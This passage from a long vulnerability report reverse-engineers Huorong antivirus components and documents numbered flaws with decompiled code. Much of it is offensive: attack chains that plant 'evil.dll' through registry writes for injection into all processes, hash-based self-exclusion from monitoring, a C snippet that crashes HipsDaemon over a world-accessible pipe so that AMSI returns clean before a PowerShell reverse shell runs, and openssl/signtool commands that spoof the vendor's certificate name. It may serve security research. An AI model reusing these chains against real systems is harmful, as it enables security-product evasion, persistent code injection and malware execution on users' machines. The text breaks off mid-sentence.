        h0 ^= murmur_mix(d0)
        h0 = (h0 * m) & 0xFFFFFFFF
        h1 ^= murmur_mix(d1)
        h1 = (h1 * m) & 0xFFFFFFFF
        i += 8
    # tail handling omitted for brevity — see full impl
    return (h0 << 32) | h1

# To exclude "malware.exe":
target_hash = pblist_hash("malware.exe")
# Serialize as little-endian QWORD, merge into existing PBList (maintain sort order)
# Write to HKLM\SYSTEM\CCS\Services\sysdiag\conf\PBList (REG_BINARY)
```

**Effect**: `malware.exe` never receives `dtrampo.dll` injection → no `HookNtOpenProcess`, no `HookCreateFile`, no `HookCreateProcess` inside `malware.exe` → full unmonitored operation.

This is a **self-exclusion bypass**: attacker excludes their own process name from Huorong's userland hook injection, then runs freely while staying in the registry PBList that Huorong itself reads.

---

### 27.3 Flaw 11 — IRP_MJ_SET_INFORMATION: 50+ Unmonitored FileInformationClass Values

**Severity: MEDIUM** — File operations that bypass Huorong's minifilter monitoring.

#### Root Cause

`sub_1400575C0` (IRP_MJ_SET_INFORMATION handler) switch:

```c
// sub_1400575C0 @ 0x1400575C0
switch (Iopb->Parameters.SetFileInformation.FileInformationClass) {
    case FileBasicInformation:             // 4  — timestamps, attributes
    case FileRenameInformation:            // 10 — rename
    case FileLinkInformation:             // 11 — hard link
    case FileDispositionInformation:      // 13 — delete-on-close
    case FileAllocationInformation:       // 19 — allocation size
    case FileEndOfFileInformation:        // 20 — EOF / truncate
    case FileDispositionInformationEx:    // 64 — delete-on-close (Ex)
    case FileLinkInformationEx:           // 65 — hard link (Ex)
    case FileRenameInformationEx:         // 72 — rename (Ex)
        return 0;  // → send to rule engine
    default:
        return 1;  // → PASS UNMONITORED
}
```

**All other classes** (Windows defines 80+) fall through to `return 1` = unmonitored.

#### High-Value Unmonitored Classes

| Class# | Name | Abuse Potential |
|--------|------|----------------|
| 0x27 (39) | FileValidDataLengthInformation | Expose uninitialized disk data without writes that Huorong monitors |
| 0x28 (40) | FileShortNameInformation | See Flaw 2 (8.3 name manipulation) |
| 0x01 (1) | FileDirectoryInformation | (query-side, in this context) |
| 0x35 (53) | FileIoPriorityHintInformation | I/O scheduling bypass |
| 0x41 (65) | FileStorageReserveIdInformation | Volume/WofStream manipulation |
| 0x55 (85) | FileCaseSensitiveInformation | Change case-sensitivity of dir on NTFS |
| 0x58 (88) | FileKnownFolderInformation | Redirect system known folders |

#### FileValidDataLengthInformation Exploit Detail

`FileValidDataLengthInformation` (class 39 / 0x27) sets `ValidDataLength` on a file:

```c
// Kernel: NtSetInformationFile → IoSetInformation → CcSetValidData
// Sets FILE_OBJECT::Vcb::VDL → allows read of uninitialized disk clusters
// without ever writing to the file (no FileEndOfFileInformation = no monitoring)
```

Attack: Create a sparse file, extend EOF (monitored), then use `FileValidDataLengthInformation` to set VDL = EOF → uninitialized disk sectors readable via normal read. Can extract previously-deleted data or create disk-layout primitives. **No Huorong alert.**

---

### 27.4 Flaw 12 — `dword_140077D88` Bit 1: File Monitoring Entirely Off at Boot

**Severity: HIGH** — Extension of Flaw 4 (which covered bit 2 for registry); bit 1 gates ALL file monitoring.

#### Root Cause

`sub_140048E90` (file rule checker):

```c
// sub_140048E90 @ 0x140048E90
if ((dword_140077D88 & 2) == 0) return 0;   // bit 1 = 0 → ALL file rules disabled
if (a4) return 0;
if (sub_140017780(a2)) return 0;             // process exclusion
// ... rest of rule engine
```

`dword_140077D88` is a bitmask set by HipsDaemon via IOCTL after it initializes. At driver load (before HipsDaemon connects), it is zero.

| Bit | Meaning | IOCTL code |
|-----|---------|------------|
| 0 | Unknown feature | TBD |
| 1 | **File monitoring enabled** | Set by HipsDaemon after rules loaded |
| 2 | Registry monitoring enabled | Set by HipsDaemon after rules loaded |

#### Boot Window Attack

```
T=0ms:   sysdiag.sys loaded → dword_140077D88 = 0 → file + registry rules DISABLED
T=0ms:   hrelam.sys registers early launch (too early for ELAM callbacks to matter here)
T=??ms:  HipsDaemon.exe starts (USER MODE — after session 0 init)
T=??ms:  HipsDaemon reads rule DB, calls IOCTL → sets bits 1 and 2
T=??ms:  dword_140077D88 = 3 → monitoring active
```

**Window**: From T=0 to T=HipsDaemon-IOCTL. In practice: **200ms–2 seconds** depending on system load.

Within this window:
- Write to ANY watched registry key → unmonitored (no CmCallback rule engine)
- Open/rename/modify ANY protected file → unmonitored (no FltMgr callbacks)
- Drop DLL/EXE anywhere → unmonitored

Combined with Flaw 4 (AppInit_DLLs writes) and Flaw 8 (LPC crash), the window can be **extended indefinitely** by keeping HipsDaemon from completing init.

#### Extended Attack (combining with Flaw 3)

```
[T=0] sysdiag loads → monitoring window open
[T=1] Race: craft process that immediately writes protected keys (AppInit_DLLs, etc.)
      → Huorong rules not yet active → writes succeed
[T=2] If HipsDaemon starts and might catch up:
      → send malformed LPC to HipsDaemon port → exception → crash → restart loop
      → during crash/restart: bit 1 clears again (HipsDaemon was the only one setting it)
      → re-open window
```

---

### 27.5 Combined Flaw 9+10+12 Attack Chain: Stealth Kernel-Mediated Code Injection

#### Overview

```
Actor: Admin-level attacker (e.g., achieved via Flaw 5/6/7 earlier)
Goal:  Inject arbitrary DLL into all user processes, persist across reboots
       with zero Huorong detection
```

#### Step-by-Step

```
[T=0] Attacker has admin shell (sysdiag service reg writable, no special privileges needed)

[Step 1] Flaw 12: Race the boot window (or trigger service restart via legitimate API)
         → Confirm dword_140077D88 bit 1 = 0 (file monitoring off)

[Step 2] Flaw 9: Overwrite TrampoLib64 registry key
         RegSetValueExW(HKLM,
             L"SYSTEM\\CCS\\Services\\sysdiag\\conf",
             0, L"TrampoLib64", REG_SZ,
             L"C:\\Windows\\System32\\evil.dll", ...)
         → No Huorong CmCallback on this key
         → No Huorong file monitoring (bit 1 = 0 during window)

[Step 3] Flaw 10: Add self-exclusion to PBList
         → Compute MurmurHash2A("attacker.exe") → 64-bit Key
         → Append sorted to existing PBList blob
         → Write to HKLM\...\sysdiag\conf\PBList
         → "attacker.exe" now excluded from injection (no dtrampo.dll hooks)

[Step 4] Trigger sysdiag driver reload (e.g., via DeviceIoControl if accessible,
         or schedule reboot)
         → sysdiag reads conf\TrampoLib64 = "evil.dll"
         → sysdiag reads conf\PBList (includes attacker.exe hash)

[Step 5] Post-reload:
         → sysdiag.sys injects evil.dll into EVERY process (except attacker.exe)
         → evil.dll runs in: lsass.exe, winlogon.exe, explorer.exe, browsers, etc.
         → evil.dll runs at SYSTEM-level injection context from a trusted driver
         → Huorong dtrampo.dll NOT in attacker.exe → attacker.exe: unmonitored

[Result]:
  - evil.dll: persistent DLL injection into all future processes
  - attacker.exe: full blind spot (no Huorong hooks)
  - Registry write: silent (conf key unprotected)
  - File write (evil.dll): done during boot window → no file rule check
  - Zero Huorong alerts at any stage
```

---

## 28. AMSI Provider (hramsi.dll) + hrcomm.dll IPC — New Flaws

> Analysis via IDA Pro on `hramsi.dll` (0x3D000 bytes, `CAmsiScanner` class) and `hrcomm.dll` (0x2E000 bytes, `CLPCClient`/`CLPCServer`).

---

### 28.1 AMSI Architecture

`hramsi.dll` is registered as a COM in-process AMSI provider implementing `IAntimalwareProvider`. Its class is `CAmsiScanner`, registered under `HKLM\SOFTWARE\Microsoft\AMSI\Providers\{GUID}`.

Complete scan path:

```
Windows AMSI subsystem
  → CoCreateInstance(CAmsiScanner CLSID)
  → CAmsiScanner::Scan(stream, session, &AMSI_RESULT)
    = sub_180008AA0 @ 0x180008AA0
      1. Check LPC connectivity: sub_180002200(scanblock)
      2. Read stream buffer from IAmsStream interface
      3. Build JSON metadata: sub_180008CE0()  [name, session, pid, size, appname, contentname]
      4. sub_1800087A0() → LPC call to HipsDaemon "ScanAmsiStream"
      5. If detected: *AMSI_RESULT = 0x8000 (AMSI_RESULT_DETECTED)
```

The LPC transport is `hrcomm.dll` via Named Pipe `\\.\Global\Pipe\Global\Huorong::HipsMonServer`.
Protocol: JSON-RPC 2.0 over Named Pipe.

---

### 28.2 Flaw 13 — AMSI Bypass: HipsDaemon Disconnection → Always CLEAN

**Severity: HIGH** — All AMSI scans return CLEAN when HipsDaemon is down.

#### Root Cause

`sub_1800087A0` @ 0x1800087A0 (the actual LPC scan function):

```c
bool __fastcall ScanViaLPC(__int64 a1) {
    int v24 = 0;  // "default" result, init = 0 (CLEAN)
    
    // Gate 1: check LPC client connected
    if (!sub_180002200())  // checks 3 fields in scanblock: all must be nonzero
        goto LABEL_2;      // ← BYPASS: fall through if disconnected
    
    // Gate 2: check AmsiTreatDone callback registered
    if (!sub_180008630(&v18))
        goto LABEL_2;      // ← BYPASS: fall through if callback missing
    
    // ... send JSON-RPC "ScanAmsiStream" to HipsDaemon ...
    
LABEL_2:
    v2 = (v24 == 0);   // v24 = 0 → v2 = true → return !true = false (CLEAN)
    return !v2;         // RETURNS FALSE = not detected = CLEAN
}
```

If `sub_180002200` returns false (LPC client not initialized or pipe broken):
- `v24 = 0` (unchanged)
- `LABEL_2`: `v2 = (0 == 0) = true`
- `return !v2 = false` → **AMSI returns CLEAN for all content**

`sub_180002200` itself:
```c
bool sub_180002200(__int64 a1) {
    return *(BYTE*)(a1+8) && *(QWORD*)(a1+32) && *(QWORD*)(a1+48);
    // All three connectivity fields must be nonzero
}
```

#### Trigger

Kill HipsDaemon (Flaw 3, malformed LPC message) or prevent it from starting:
- `CLPCClient` fields `a1+8`, `a1+32`, `a1+48` reset to 0 → connectivity check fails
- All subsequent AMSI scans → CLEAN immediately

#### Impact

Any PowerShell/VBScript/JScript/CLR-hosted script passes AMSI without scanning. Includes:
- `IAmsiStream::Read` → `CAmsiScanner::Scan` → falls to LABEL_2 → CLEAN
- AMSI does NOT call secondary providers on S_OK from primary provider
- Window: persists until HipsDaemon restarts and pipe reconnects (~1-5 seconds minimum)

---

### 28.3 Flaw 14 — AMSI Bypass: Scan Timeout Uses Fail-Open Default

**Severity: MEDIUM** — Slow HipsDaemon response → AMSI CLEAN verdict.

#### Root Cause

`sub_1800087A0` timeout logic:

```c
dwMilliseconds[0] = 30000;  // initial timeout = 30s

// HipsDaemon response: {result: {detected: bool, timeout: int, default: bool}}
json_unpack(response, "{s:{s:b,s:i,s:b}}", "result",
    "detected", &v25,           // 0 or 1
    "timeout",  &dwMilliseconds, // wait this long for async
    "default",  &v24);           // what to return on timeout

if (v25 && dwMilliseconds[0] > 0) {
    v15 = min(dwMilliseconds[0], 120000);  // cap at 120s
    if (WaitForSingleObject(event, v15) != WAIT_OBJECT_0) {
        v16 = v24;    // TIMEOUT → use "default" value
    } else {
        v16 = *(a1+96);  // completed → use actual scan result
    }
    v25 = v16;
}
// return v25 != 0
```

If `v24` (the "default" field) = 0 and the event is not signaled within `min(timeout, 120s)`:
- v25 = v24 = 0
- return `v25 != 0` = `0 != 0` = false = **CLEAN**

This is a **fail-open timeout**. HipsDaemon can respond `{detected: true, timeout: 30000, default: false}`, then be killed before it fires the `AmsiTreatDone` callback → result = default = false = CLEAN.

#### `AmsiTreatDone` Callback (`sub_180007AE0`)

```c
// Called when HipsDaemon finishes scanning
if (json_object_get(a1, "detected") &&
    *(_DWORD*)json_object_get(a1, "detected") == 5) {  // 5 = JSON_TRUE in jansson
    _InterlockedExchange((volatile __int32*)(v7+96), 1);  // set detected=1
} else {
    _InterlockedExchange((volatile __int32*)(v7+96), 0);  // set detected=0
}
SetEvent(*(HANDLE*)(v7+88));  // signal event
```

If "detected" key is missing from the callback JSON → else branch → detected=0 → CLEAN. Missing key forces CLEAN verdict.

---

### 28.4 Flaw 15 — Named Pipe World-Accessible DACL: Unauthenticated JSON-RPC to HipsDaemon

**Severity: HIGH** — Any local process (any privilege level) can send JSON-RPC requests to HipsDaemon.

#### Root Cause

`sub_180004730` @ 0x180004730 in hrcomm.dll creates the pipe security descriptor:

```c
// SID setup
DWORD Value[0..3] = 0;
WORD  Value[4..5] = 0x0100;  // big-endian → authority = 1 = SECURITY_WORLD_SID_AUTHORITY
AllocateAndInitializeSid(&authority, 1, 0, ...);  // → S-1-1-0 (Everyone)

// ACE setup
pListOfExplicitEntries.grfAccessPermissions = 0x10000000; // GENERIC_ALL
pListOfExplicitEntries.grfAccessMode = 2;                 // SET_ACCESS (grant)
pListOfExplicitEntries.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
pListOfExplicitEntries.Trustee.ptstrName = sid;           // Everyone

SetEntriesInAclW(1, &ace, NULL, &acl);
InitializeSecurityDescriptor(sd, SECURITY_DESCRIPTOR_REVISION);
SetSecurityDescriptorDacl(sd, TRUE, acl, FALSE);
```

**Result**: Named Pipe `\\.\Global\Pipe\Global\Huorong::HipsMonServer` grants `GENERIC_ALL` to **Everyone (`S-1-1-0`)**.

#### No Authentication

The `CLPCServer` (HipsDaemon) does not verify the identity of connecting clients:
1. Any process connects via `CreateFileA("\\.\Global\Pipe\Global\Huorong::HipsMonServer", GENERIC_READWRITE, ...)`
2. Sends JSON-RPC: `{"jsonrpc":"2.0", "method":"<name>", "params":{...}, "id":1}`
3. HipsDaemon parses and dispatches to the registered method handler

Message routing in `sub_180003D60`:
```c
if (json_object_get(msg, "method")) {
    // Is a JSON-RPC request (has "method" field)
    if (id_field && *(DWORD*)id_field == JSON_INTEGER) {
        // Put in request queue → trigger request handlers
    } else {
        // Put in notification queue
    }
} else {
    // No "method" → JSON-RPC response → put in response queue
}
```

HipsDaemon processes ALL incoming requests without verifying sender identity.

#### Attack Vectors

1. **Crash HipsDaemon**: Send malformed JSON-RPC (e.g., null bytes embedded, oversized message) → exception in HipsDaemon → crash → AMSI bypass (Flaw 13 triggered)
2. **Query methods**: Send `{"method":"MethodSupport","params":{},"id":1}` → enumerate all implemented methods
3. **Invoke protected operations**: Any method HipsDaemon implements via this pipe is reachable by any local user
4. **DoS via pipe flooding**: No size check before `json_loads` → send large JSON → OOM / slow HipsDaemon

#### Exploit (AMSI bypass via unauthenticated pipe crash):

```c
// Connect to HipsDaemon's pipe as any local user
HANDLE hPipe = CreateFileA(
    "\\\\.\\Global\\Pipe\\Global\\Huorong::HipsMonServer",
    GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

// Send oversized/malformed JSON-RPC to crash HipsDaemon
const char *payload = "{\"jsonrpc\":\"2.0\",\"method\":\"ScanAmsiStream\","
    "\"params\":{\"session\":9999999999999999999999},\"id\":1}";
DWORD written;
WriteFile(hPipe, payload, strlen(payload) + 1, &written, NULL);
CloseHandle(hPipe);

// HipsDaemon: json integer overflow / exception → crash
// → AMSI provider: sub_180002200() returns false
// → ALL AMSI scans return CLEAN
// → Execute: powershell -enc <base64_payload>
```

---

### 28.5 Combined Attack Chain: Low-Privilege AMSI Bypass

```
Actor: Low-privilege local user (no admin, no special tokens)
Goal:  Execute PowerShell malware without Huorong AMSI detection

[Step 1] Open pipe (world-accessible DACL, Flaw 15):
         hPipe = CreateFile("\\.\Global\Pipe\Global\Huorong::HipsMonServer", ...)

[Step 2] Send malformed JSON-RPC → crash HipsDaemon (Flaw 3 / Flaw 15 combined):
         Write(hPipe, "{malformed JSON}", ...)
         → HipsDaemon exception → process crash

[Step 3] Race window (Flaw 13): immediately execute PowerShell:
         powershell -enc <base64 reverse shell>
         → CAmsiScanner::Scan() called
         → sub_180002200() = false (pipe down)
         → LABEL_2 → return CLEAN
         → PowerShell executes without Huorong scan

[Step 4] If HipsDaemon restarts → repeat Step 1-3 until payload executes
         (restart typically takes 2-5 seconds on modern hardware)

[Result]:
  - No admin privileges required
  - No kernel exploit required
  - No file write required (payload in-memory PowerShell)
  - Zero Huorong AMSI alerts
```

---

## 29. Second Unauthenticated Named Pipe + Exposed Method Surface

> Analysis of HipsDaemon's internal `HIPS_FILEMAPBLOCK_SERVER_NAME` server and its registered methods.

---

### 29.1 Second World-Accessible Pipe: `HIPS_FILEMAPBLOCK_SERVER_NAME`

HipsDaemon creates **two** LPC servers, both via `CreateLPCServer()` from `hrcomm.dll`:

| Server | Pipe Name | DACL |
|--------|-----------|------|
| Main | `Global\Huorong::HipsMonServer` | Everyone = GENERIC_ALL |
| AMSI/COM | `HIPS_FILEMAPBLOCK_SERVER_NAME` | Everyone = GENERIC_ALL |

`sub_14003B7E0` creates the second server:

```c
// sub_14003B7E0 @ 0x14003B7E0
LPCServer = CreateLPCServer();    // same hrcomm.dll code path → same Everyone DACL
(LPCServer->vtable[1])(LPCServer, "HIPS_FILEMAPBLOCK_SERVER_NAME");  // set name
(LPCServer->vtable[2])(LPCServer, 4);  // max 4 connections
(LPCServer->vtable[3])(LPCServer, 0);  // flag
sub_14003BC90(a1);                // register JSON-RPC methods
(LPCServer->vtable[7])(LPCServer);    // start listening
```

Win32 path: `\\.\Global\Pipe\HIPS_FILEMAPBLOCK_SERVER_NAME`

---

### 29.2 Exposed JSON-RPC Methods (Flaw 16)

`sub_14003BC90` registers the following handlers on the AMSI server:

```c
// sub_14003BC90 @ 0x14003BC90 — method registration
server->RegisterMethod("ScanAmsiStream",    sub_14003B880);
server->RegisterMethod("ComOutlookScanMail", sub_14003B910);
server->RegisterMethod("OfficeAntiVirus",   sub_14003B9D0);
server->RegisterMethod("CreateFileMap",     sub_14003BA80);
server->RegisterMethod("DestoryFileMap",    sub_14003BB70);
```

**All callable by any local user via the world-accessible pipe.**

#### `CreateFileMap` Handler Analysis

`sub_14003BA80` disassembly:

```asm
; json_unpack(params, "{s:s,s:I}", "mapname", &mapname, "mapsize", &mapsize)
lea rdx, aSSSI       ; "{s:s,s:I}"
lea r8,  aMapname    ; "mapname"
lea r9,  [mapsize]
mov [rsp+20h], &mapname
call json_unpack

; Creates file mapping: sub_140039010(global_map_registry, mapname, mapsize)
mov r8,  [rsp+60h]  ; mapsize
mov rdx, [rsp+68h]  ; mapname (attacker-controlled string)
lea rcx, qword_140174190
call sub_140039010  ; → CreateFileMappingA(INVALID_HANDLE_VALUE, sd, PAGE_READWRITE, 0, mapsize, mapname)

; Returns {success: bool}
```

HipsDaemon (runs as SYSTEM) creates a named shared memory object with:
- **Name**: caller-controlled via `mapname` parameter
- **Size**: caller-controlled via `mapsize` parameter
- **Backing**: anonymous (`INVALID_HANDLE_VALUE`)
- **Prefix**: likely `Global\` (accessible from any session)

#### Attack: Name Squatting / Denial of Service

```c
// Any local user can:
HANDLE hPipe = CreateFileA("\\\\.\\Global\\Pipe\\HIPS_FILEMAPBLOCK_SERVER_NAME",
    GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

// Create a named section that interferes with Huorong's own scan infrastructure
const char *req = "{\"jsonrpc\":\"2.0\",\"method\":\"CreateFileMap\","
    "\"params\":{\"mapname\":\"HIPS_SCAN_RESULT_0\",\"mapsize\":65536},\"id\":1}";
DWORD written;
WriteFile(hPipe, req, strlen(req)+1, &written, NULL);
// → HipsDaemon creates Global\HIPS_SCAN_RESULT_0 on behalf of attacker
// → Attacker can now open this section and read/write to it
// → If Huorong's own scan process later tries to create the same name → ALREADY_EXISTS
//   → Huorong opens existing section → reads/writes attacker-controlled memory
//   → Arbitrary scan result injection
```

#### `ScanAmsiStream` Callable by Any Local User

With the pipe world-accessible, any process can send `ScanAmsiStream` to:
- **Spam scans**: flood HipsDaemon with fake scan requests → CPU saturation → slow/block legitimate scans
- **Probe scan engine state**: send payloads and observe scan timing to reverse-engineer detection rules
- **Interfere with AMSI scan sessions**: inject responses with arbitrary session IDs to corrupt `AmsiTreatDone` callbacks in hramsi.dll

---

### 29.3 Flaw 17 — Signature CN Check Without Chain Validation

**Severity: LOW-MEDIUM** — Self-signed cert with spoofed CN passes Huorong signature check.

`sub_140019910` (signature extractor in HipsDaemon):

```c
// Step 1: Open primary signature
CryptQueryObject(1, file_path, 0x3FFEu, 2, ...);  // dwObjectType=1=file

// Step 2: Extract CN from nested sig (OID 1.3.6.1.4.1.311.2.4.1)
CertFindAttribute("1.3.6.1.4.1.311.2.4.1", attr_count, attr_array);

// Step 3: Recursively follow all nested sigs, extract innermost CN
while (nested_sig_found) {
    CryptQueryObject(2, nested_sig_blob, ...);  // dwObjectType=2=raw blob
    CN = sub_140019530(cert_store, msg);         // extract Subject CN
    look_for_deeper_nesting();
}
return innermost_CN;   // ← No WinVerifyTrust, no chain validation, no CRL check
```

**Missing validations:**
- No `WinVerifyTrust` call — Authenticode integrity NOT verified
- No `CertGetCertificateChain` — cert chain NOT validated
- No expiry check — expired certs accepted
- No revocation check — revoked certs accepted
- Only the `SubjectCN` text is extracted and returned

This function is used in `sub_1400459A0` ("inBlackList" context), where it compares the CN against a trusted entry's `"signature"` field. In the blacklist path, SHA256 is also verified — so creating a spoofed-CN binary does not directly bypass the blacklist check. However:

1. Any other internal check that uses `sub_140019910` and compares only the CN (without SHA256) can be bypassed
2. Security tooling integrating with HipsDaemon via its API may incorrectly trust the returned CN value
3. Signer name visible in HipsDaemon's UI / log will show spoofed company name

**Bypass for CN-only paths:**
```bash
# Create self-signed cert with Huorong's company CN
openssl req -x509 -newkey rsa:2048 -keyout evil.key -out evil.crt \
  -subj "/CN=Beijing Huorong Network Technology Co., Ltd."
# Sign binary with this cert (as nested sig via signtool /as /fd sha256)
signtool sign /as /fd sha256 /f evil.pfx /p password evil.exe
# sub_140019910 returns "Beijing Huorong Network Technology Co., Ltd."
# → passes any CN-only check
```

---

## 30. New Flaws Discovered — Session 3 (Process Exclusion Deep Dive)

> All findings in this section come from live IDA disassembly of `sysdiag.sys :: sub_14001A530` — the main process-event handler called from `PsSetCreateProcessNotifyRoutineEx`. The function is 0x1CDA bytes (~7000 bytes) of dense logic.

---

### 30.1 Flaw 18 — Process Exclusion Slot Assigned by Filename Hash Only, No Integrity Check

**Severity: HIGH** — Any process with the correct filename can claim kernel-mode monitoring exclusion.

#### Root Cause

`sub_14001A530` (process creation event handler) maintains a cascade of kernel globals that track specific Huorong process PIDs. The most security-sensitive slot is `qword_1400FE080` — checked by `sub_140017780` to exempt a process from ALL file system monitoring:

```c
// sub_140017780 @ 0x140017780
return a1 == qword_1400FE080;  // if PID matches → return true → skip all monitoring
```

The slot is populated at `0x14001be72–0x14001be98`:

```asm
; @ 0x14001BE72  — qword_1400FE080 SET logic
loc_14001BE72:
  cmp  cs:qword_1400FE080, r13    ; is slot empty? (r13 = 0)
  jnz  short loc_14001BEA4        ; no → skip
  test edx, edx
  jnz  short loc_14001BEA4        ; special-flag set → skip
  mov  rdx, 0B65BAFAF9h           ; filename stem hash
  cmp  [rsi], rdx                 ; [rsi] = MurmurHash2A(stem, seed=0x19870714)
  jnz  short loc_14001BEA4        ; hash mismatch → skip
  cmp  [rdi+38h], rax             ; parent PID == qword_1400FE078?
  jnz  short loc_14001BEA4        ; no → skip
  mov  rax, [rdi+30h]             ; rax = new process PID
  mov  cs:qword_1400FE080, rax    ; ← SET EXCLUSION SLOT
  jmp  loc_14001BFD0
```

Where:
- `[rsi]` = `[rdi+0xF80]` = MurmurHash2A of the process image filename **stem** (UTF-16LE lowercase, extension stripped), computed inline in `sub_14001A530`
- `[rdi+38h]` = **parent PID** of the newly-created process (from `CreateInfo->ParentProcessId`)
- `rax` at `cmp [rdi+38h], rax` = `cs:qword_1400FE078` loaded at `0x14001be40`

#### Full PID Tracking Cascade (0x14001BDC0–0x14001BE9F)

The function maintains **six separate kernel globals**, each keyed by a filename stem hash:

| Address | Hash Checked | Slot Populated | Extra Condition |
|---------|-------------|----------------|-----------------|
| `0x14001BE03` | `0x9373B8320` | `qword_1400FE068` | slot == 0 |
| `0x14001BE2B` | `0xC2C33AE73` | `qword_1400FE070` | slot == 0 |
| `0x14001BE5D` | `0x86D5C274F` | `qword_1400FE078` | slot == 0 AND arg_8 == 0 |
| `0x14001BE89` | `0xB65BAFAF9` | `qword_1400FE080` | slot == 0 AND arg_8 == 0 AND parent PID == `qword_1400FE078` |
| `0x14001BEB8` | `0xCDD5B8EB3` | `qword_1400FE490[]` | slot[r9+rcx] == 0 |
| `0x14001BEFB` | `0xBE4696042` | `[0x1400FE290+idx]` | slot == 0 AND `NtBuildNumber` >= `0x1770` (Win10 1607+) |

All hashes are MurmurHash2A (seed `0x19870714`, multiplier `0x5BD1E995`) of the lowercase filename stem without extension, computed in UTF-16LE. The exact process names are unknown (hash pre-image not directly recoverable from the binary), but correspond to Huorong's own internal processes.

#### Missing Checks — No Integrity Validation

The slot assignment checks **nothing about process security**:
- No integrity level (Low/Medium/High/System)
- No code signing or Authenticode verification
- No token SID check (no SYSTEM/Huorong-account requirement)
- No PPID validation except for the `qword_1400FE080` slot (which only requires parent PID == `qword_1400FE078`)

#### Race Condition (No Mutex)

The read-check-write sequence is **not atomic**:

```asm
cmp  cs:qword_1400FE080, r13   ; READ (not locked)
jnz  skip
...
mov  cs:qword_1400FE080, rax   ; WRITE (not locked)
```

`WorkerRoutine` (`0x14001C210`) clears the slot with `xchg` on process exit:
```asm
xor  eax, eax
xchg rax, cs:qword_1400FE080   ; atomically clear
```

There is a window between `xchg` (clear) and the next legitimate write where a racing process creation callback sees the slot as 0. Two concurrent process-create callbacks could both pass the `cmp == 0` check; last writer wins, potentially displacing the legitimate Huorong process.

#### Attack Path

```
Prerequisites:
  1. Know filename with hash 0x86D5C274F (call it "ParentProc.exe")
     → find by running Huorong, enumerating processes named HR*.exe, computing hashes
  2. Know filename with hash 0xB65BAFAF9 (call it "ExcludedProc.exe")
  
Execution:
  [T=0] Create process named "ExcludedProc.exe" (copy our binary to that path)
        with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS pointing to the running
        "ParentProc.exe" (PID stored in qword_1400FE078)
  
  [T=1] sysdiag.sys process-create callback fires:
        - hash("excludedproc") == 0xB65BAFAF9 ✓
        - parent PID == qword_1400FE078 ✓
        - qword_1400FE080 == 0 ✓ (before legitimate process restarts)
        → qword_1400FE080 = OUR PID
  
  [T=2] sub_140017780(our_pid) returns true for all future checks
        → our process is EXEMPT from all sysdiag.sys file monitoring
        → can read/write/execute anything without Huorong interference
```

**Note**: This attack requires either (a) knowing the exact filenames, or (b) finding them via process enumeration + hash brute-force over a small candidate set (Huorong process names are publicly known from installation directories).

#### Additional Finding: Process Exclusion Globals Are Read-Only Mapped to User Space?

`qword_1400FE080` is at VA `0x1400FE080` in the kernel image — a read-only `.data` section from user-mode perspective. However, if the AMD Ryzen Master arbitrary physical read/write primitive (documented separately) is available, these kernel globals can be written directly from user mode, trivially setting `qword_1400FE080 = ANY_PID`.

---

### 30.2 Flaw 19 — Indexed PID Array (`qword_1400FE490[]`) Allows Parallel Slot Claiming

**Severity: MEDIUM** — Multiple processes with hash `0xCDD5B8EB3` can each claim an array slot.

#### Root Cause

At `0x14001BEA4–0x14001BEC9`:

```asm
; Check array slot indexed by r9+rcx
cmp  rva qword_1400FE490[r9+rcx], r13    ; slot[r9+rcx] == 0?
jnz  short loc_14001BECE                 ; no → next check
mov  rax, 0CDD5B8EB3h
cmp  [rsi], rax                          ; hash match?
jnz  short loc_14001BECE
mov  rax, [rdi+30h]                      ; new process PID
mov  rva qword_1400FE490[r9+rcx], rax    ; store PID in array slot
jmp  loc_14001BFD0
```

The index `r9+rcx` is computed from processor/NUMA context — this is a **per-CPU or per-NUMA-node array** allowing multiple simultaneous exclusions for processes with hash `0xCDD5B8EB3`. Unlike `qword_1400FE080` (single slot), this array can hold one PID per CPU.

#### Impact

1. **All array slots can be claimed simultaneously** by creating one process with hash `0xCDD5B8EB3` per CPU, all with the same filename — no parent-PID constraint on this slot
2. After all slots filled, the `qword_1400FE490[]` array is saturated → legitimate Huorong process of this type cannot register → monitoring gap for that process type
3. The Win10-1607-gated `0x1400FE290` array has the same structure but only activates on newer builds, meaning pre-1607 builds have NO tracking for hash `0xBE4696042` processes at all

#### Same Missing Integrity Checks

No code signing, no integrity level, no SID check — filename stem hash alone governs slot assignment in the array.

---

### 30.3 Sub-Finding: `sub_140017B60` — Command-Line Normalizer for 8 Trusted Process Hashes

When `[rdi+0xAD0]` (a separately-computed hash, stored before the instructions we analyzed) matches any of these 8 constants:

```
0x74D32E3C5, 0xB1DC7157D, 0xBE891CC3C, 0x921FC72DB,
0x7DB6A6488, 0xE19A262E9, 0xCA07778F0, 0x878ECEBD
```

→ `sub_140017B60` is called. This function **parses and normalizes the process command line** to reformat arguments (handling Windows quoting rules: `\"`, `\\`, quoted paths with spaces). Its output (if argument count ≥ 2) is atomically swapped into the process struct at `[a1+0x78]` via `InterlockedCompareExchange64`.

**Security relevance**: If an attacker can create a process with a filename whose hash at `[rdi+0xAD0]` matches one of these 8 values (via PPID spoofing or filename impersonation), `sub_140017B60` will be called and will parse and store the command line into the process struct. If the command line contains crafted data that exploits a parsing bug in `sub_140017B60`, this could corrupt kernel-mode data structures. (Detailed parsing-bug analysis is left for future work.)

---

## 31. New Flaws Discovered — Session 3 (AMSI/HipsDaemon Dispatch Analysis)

> All findings below come from live IDA decompilation of `HipsDaemon.exe` functions `sub_14003B880`, `sub_14003A670`, `sub_140040870`, `sub_140039A00`, and `sub_140008470`.

---

### 31.1 Flaw 20 — ScanAmsiStream Handler: Invalid PID → Fail-Open CLEAN

**Severity: MEDIUM** — Any AMSI scan request with an invalid or terminated PID returns CLEAN without scanning.

#### Root Cause

`sub_140040870` (PID-based exclusion check in HipsDaemon) @ `0x140040870`:

```c
// a1 = scanner context, a2 = PID (from ScanAmsiStream JSON params)
v5 = sub_140040E90(a2);          // resolve PID → process path (OpenProcess+QueryFullProcessImageName)
if (v5 && *((int*)String[0] - 4))  // v5 != 0 AND path is non-empty
{
    wcslwr_s(path, pathlen+1);         // lowercase path
    sub_140012D00(&block, path, 65001); // UTF-8 convert
    v8 = sub_140018FC0(a1+32, block);  // check against exclusion list
}
else
{
    v8 = 1;  // ← FAIL-OPEN: path lookup failed → treat as "excluded"
}
return v8;   // 1 = excluded → caller returns CLEAN verdict
```

**The else branch always returns 1 ("excluded") when:**
